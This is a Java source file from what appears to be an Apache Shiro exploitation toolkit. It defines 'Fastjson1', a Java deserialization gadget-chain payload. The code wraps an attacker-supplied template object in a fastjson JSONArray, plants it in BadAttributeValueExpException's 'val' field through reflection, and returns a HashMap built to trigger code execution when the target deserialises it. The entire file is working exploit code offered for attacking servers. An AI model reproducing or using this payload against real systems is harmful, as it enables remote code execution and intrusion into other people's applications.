package com.sma11new.exp.shiro.attack.payloads;

import com.alibaba.fastjson.JSONArray;
import com.sma11new.exp.shiro.attack.payloads.annotation.Dependencies;
import com.sma11new.exp.shiro.attack.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.alibaba:fastjson:1.2.83"})
public class Fastjson1 implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        // PayloadRunner.run(Fastjson1.class, args);
    }

    public Object getObject(Object template) throws Exception {
        // final Object template = Gadgets.createTemplatesImpl(command);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(template);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(template, badAttributeValueExpException);

        return hashMap;
    }
}
